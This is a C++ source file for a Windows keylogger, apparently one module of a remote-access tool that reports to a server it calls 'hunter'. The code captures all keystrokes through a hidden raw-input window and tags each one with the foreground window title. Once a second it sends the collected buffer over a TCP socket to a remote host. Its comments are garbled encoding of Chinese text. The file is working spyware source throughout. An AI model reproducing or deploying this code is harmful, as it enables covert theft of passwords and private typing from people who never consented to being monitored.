#include "pch.h"
#include "Keybd.h"
#include "VirtualKeyToAscii.h"

static Keybd gKbd; // ��ʼ����
static HWND s_hWnd = NULL; // ��������ԭʼ�豸��������δ��ھ��
static TcpSocket gSock; // �����ͻؼ�������
static std::vector<char> gBuffer; // �������ݻ�����

// �������ڲ�����ĳ���
// ���캯����һ��ʼ��ִ��
// �������������ش��ڲ�һֱ��¼��������
// ����ʱhunter����һ�������������
// Ҳ�Ͳ���������
Keybd::Keybd()
{
}

Keybd::~Keybd()
{
	gSock.dissconnect();
	// �������û�йؾ��˴���
	if (s_hWnd) {
		// �رռ�ʱ��
		KillTimer(s_hWnd, 0);
		// ɾ��socket
		gSock.dissconnect();
		// �رմ���
		DestroyWindow(s_hWnd);
	}
}

void Keybd::startKeybd(std::string domain, int port)
{
	// �½����ӵ�hunter�˵�socket����
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}
	// �����Ի������ԭʼ�����豸��Ϣ
	createDialogByNewThread();

	OutputDebugStringA("Started keybd success\r\n" );
}

void Keybd::createDialogByNewThread()
{
	HANDLE h = CreateThread(NULL, 0, Keybd::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

// �̺߳���
DWORD Keybd::threadProc(LPVOID)
{
	// ����һ�����ɼ��Ĵ���������win32�¼�
	// �ȴ����Ի���ģ��DLGTMPLATEA
	HGLOBAL hglb = GlobalAlloc(GMEM_ZEROINIT, 1024);
	if (!hglb) {
		OutputDebugStringA("failed to alloc DLGTMPLATEA\r\n");
		return false;
	}
	LPDLGTEMPLATEA lpdt = (LPDLGTEMPLATEA)GlobalLock(hglb);
	lpdt->style = WS_CAPTION;
	lpdt->dwExtendedStyle = 0;
	lpdt->x = 0; lpdt->y = 0;
	lpdt->cx = 0; lpdt->cy = 0;
	GlobalUnlock(hglb);
	// �������ζԻ���
	int ret = DialogBoxIndirectParamA(NULL, lpdt, NULL, keybdWndProc, NULL);

	if (ret == -1) {
		OutputDebugStringA("Failed to create dialog box for keybd\r\n");
	}

	return true;
}

// �����̴߳��ڹ��̴�����
BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uiMsg) {
	case WM_INITDIALOG: {
		// ���ȵõ��öԻ��򴰿ھ��
		s_hWnd = hWnd;
		// ע��ԭʼ�����豸 ��ʼ���������
		regist(hWnd);
		// Ϊ�öԻ��������ʱ��
		// ʹ�ü�ʱ����ʱ���ͻ���ļ��̼�¼��Ϣ
		const int time = 1000;
		SetTimer(hWnd, 0, time, sendKeybdData);
		break;
	}
	case WM_PAINT:
		// ���ش���
		ShowWindow(hWnd, SW_HIDE);
		break;
	case WM_INPUT: {
		getKeybdData(lParam);
	}
	default:
		break;
	}

	return false;
}

// ע��ԭʼ�豸
BOOL Keybd::regist(HWND hWnd) {
	// ���� RAWINPUTDEVICE �ṹ����Ϣ ָ��Ҫ��������
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK; // ��ʹ�������Ƕ��㴰��ҲҪ����
	rawinputDevice.hwndTarget = hWnd;

	// ע��ԭʼ�����豸
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		OutputDebugStringA("failed to register raw input devices\r\n");
		return FALSE;
	}

	return TRUE;
}

// ��ȡ�������ݲ��������໺����
BOOL Keybd::getKeybdData(LPARAM lParam) {
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// ��ȡԭʼ�������ݵĴ�С
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, 
		&rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> ��ͨ����    WM_SYSKEYDOWN --> ϵͳ����(ָ����ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// ��¼�������洢���໺����
			saveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}

// ���水����Ϣ
void Keybd::saveKey(USHORT usVKey) {
	CHAR szKey[MAX_PATH] = { 0 };
	CHAR szTitle[MAX_PATH] = { 0 };
	CHAR szText[MAX_PATH] = { 0 };
	// ��ȡ���㴰��
	HWND hForegroundWnd = ::GetForegroundWindow();
	// ��ȡ���㴰�ڱ���
	::GetWindowTextA(hForegroundWnd, szTitle, 256);
	// ���������ת���ɶ�Ӧ��ASCII
	::lstrcpyA(szKey, getKeyName(usVKey));
	// ���찴����¼��Ϣ�ַ���
	::wsprintfA(szText, TEXT("[%s]	%s\r\n"), szTitle, szKey);

	// ���水����Ϣ���໺����
	for (int i = 0; i < lstrlenA(szText); i++) {
		addBuffer(szText[i]);
	}
}

void Keybd::addBuffer(char data)
{
	gBuffer.push_back(data);
}

void Keybd::delBuffer()
{
	gBuffer.clear();
}

void Keybd::sendKeybdData(HWND, UINT, UINT, DWORD)
{
	if (gBuffer.size() > 0) {
		//��û�����ӵ�socketɾ��
		// �����ӵľͷ�������
		if (!gSock.sendData(&gBuffer[0], gBuffer.size())) {
			gSock.dissconnect();
			// û�������˾���
			if (s_hWnd) {
				// �رռ�ʱ��
				KillTimer(s_hWnd, 0);
				// ɾ��socket
				gSock.dissconnect();
				// �رմ���
				DestroyWindow(s_hWnd);
			}
			OutputDebugStringA("Finished keybd\r\n");
		}
	}
	// ÿ�ζ�Ҫ�������� ֻ����ʵʱ����
	delBuffer();
}


